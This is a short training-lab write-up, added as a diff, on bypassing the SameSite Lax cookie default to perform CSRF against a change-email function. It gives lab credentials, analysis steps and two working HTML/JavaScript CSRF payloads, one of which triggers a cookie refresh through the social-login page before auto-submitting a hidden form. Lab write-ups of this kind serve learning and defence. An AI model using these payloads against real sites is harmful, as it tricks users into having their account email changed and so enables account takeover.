@@ -1,0 +1,41 @@
+Lab #10 - SameSite Lax bypass via cookie refresh
+
+Vulnerability - This lab's change email function is vulnerable to CSRF.
+
+Goal - To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.
+
+Credentials - wiener:peter
+
+Analysis:
+1. Login with credentials - wiener:peter
+2. When change email:
+- see in the response that it does not contain SameSite => it is set to default value SameSite = Lax
+- see that the request doesn't contain CSRF token
+=> In the first 120 seconds on top-level POST requests, users are susceptible to CSRF.
+
+3. Make a form and try submitting this form in the first 120 seconds:
+<form action="https://0adb009a03f5e8b580fc9e4900ac0023.web-security-academy.net/my-account/change-email" method="POST">
+    <input type="hidden" name="email" value="a1@gmail.com">
+</form>
+<script>
+    document.forms[0].submit();
+</script>
+
+=> When we immediately login again (refresh cookie), we can change email with this form.
+4. When send s request to https://0adb009a03f5e8b580fc9e4900ac0023.web-security-academy.net/social-login 
+=> It will refresh cookie token
+
+5. Make an HTML form and fool users to click this forms
+<form action="https://0adb009a03f5e8b580fc9e4900ac0023.web-security-academy.net/my-account/change-email" method="POST">
+    <input type="hidden" name="email" value="a@gmail.com">
+</form>
+<script>
+    window.onclick = () => {
+        window.open('https://0adb009a03f5e8b580fc9e4900ac0023.web-security-academy.net/social-login');
+        
+        setTimeout(() => {
+            document.forms[0].submit();
+        }, 10000);
+};
+</script>
+
